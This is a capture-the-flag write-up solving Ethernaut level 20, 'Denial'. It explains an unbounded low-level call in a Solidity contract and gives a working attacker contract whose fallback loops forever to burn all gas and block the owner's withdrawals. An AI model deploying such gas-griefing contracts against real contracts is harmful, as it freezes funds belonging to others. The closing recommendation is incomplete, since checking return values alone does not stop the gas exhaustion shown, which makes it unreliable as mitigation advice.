# Level 20 - Denial

## Objectives

- Deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less).

## Contract Overview

The `Denial` contract allows for withdrawals of funds, with a split between the withdrawal partner and the contract owner, and keeps track of the partner's balance.

## Finding the weak spots

The goal is to make the withdraw call fail. We control the partner contract. The only options we have is to do something bad in the external `call` made to the partner address.

```solidity

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}(""); // <-- this line over here
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }
```

The contract writer's idea was to ensure that even if a `revert` or `require` statement is executed within the contract, the withdrawal to the original owner would still occur. However, the contract has a potential issue with the use of the `.call` function without explicitly specifying a gas limit.

Both the `transfer` and `send` functions, which are high-level functions used to send Ether to a target address, use a fixed amount of 2300 gas to perform the operation. On the other hand, the `call` function has two options:

- it can either forward all the remaining transaction gas by default
- it can specify the amount of gas that the external contract can use with the gas parameter.

If an attacker were to consume all the available gas in the transaction, the calling function would be out of gas and fail. Unlike `revert` and `require`, the `assert` instruction consumes all gas. Therefore, if an attacker were to use an `assert` statement within the `call` function (`assert(false)` before solidity 0.8.0 and `assembly {invalid()}` after solidity 0.8.0), it could result in a denial-of-service attack and cause the calling function to fail. Instead of `assert` statement within the `call` function attacker can also use an infinite while loop `while (true) {}`.

In summary, while the contract writer's idea of allowing the withdrawal to continue even if the contract execution fails is valid, there is a potential issue with the use of the `.call` function without explicitly specifying a gas limit. This could potentially leave the contract vulnerable to a denial-of-service attack.

## Potential attack scenario (hypothesis)

Attacker can create a malicious contract with a `fallback` or `receive` function that drains all the gas and prevents further execution of the `withdraw()` function.

## Plan of the attack

1. Attacker creates the malicious contract with a `fallback` function and constructor.
2. Attacker calls the `setWithdrawPartner` function within constructor to make the address of deployed contract the partner.
3. Owner calls the `withdraw` function that makes call to `fallback()` function in the attacker malicious contract.
4. Deny the owner from withdrawing funds.

## Malicious contract (DenialAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

// 1. Attacker creates the malicious contract with a `fallback` function and constructor.
contract DenialAttack {
    Denial denialContract;

    constructor(address _denialContract) {
        denialContract = Denial(payable(_denialContract));
        // 2. Attacker calls the `setWithdrawPartner` function within constructor to make the address of deployed contract the partner.
        denialContract.setWithdrawPartner(address(this));
    }

    // 4. Deny the owner from withdrawing funds.
    fallback() external payable {
        while (true) {}
    }
}

```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/20-Denial.t.sol))

```solidity
        DenialAttack denialAttack = new DenialAttack(address(level));

        // 3. Owner calls the `withdraw` function that makes call to `fallback()` function in the attacker malicious contract.
        // The `withdraw` function will be called automatically by the `DenialFactory` contract
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Denial.png)

## Recommendations

- Always check the return value of low-level calls, especially in cases where the called address is controlled by a third party.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-19-solution-denial)
- [Blog cmichel](https://cmichel.io/ethernaut-solutions/)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
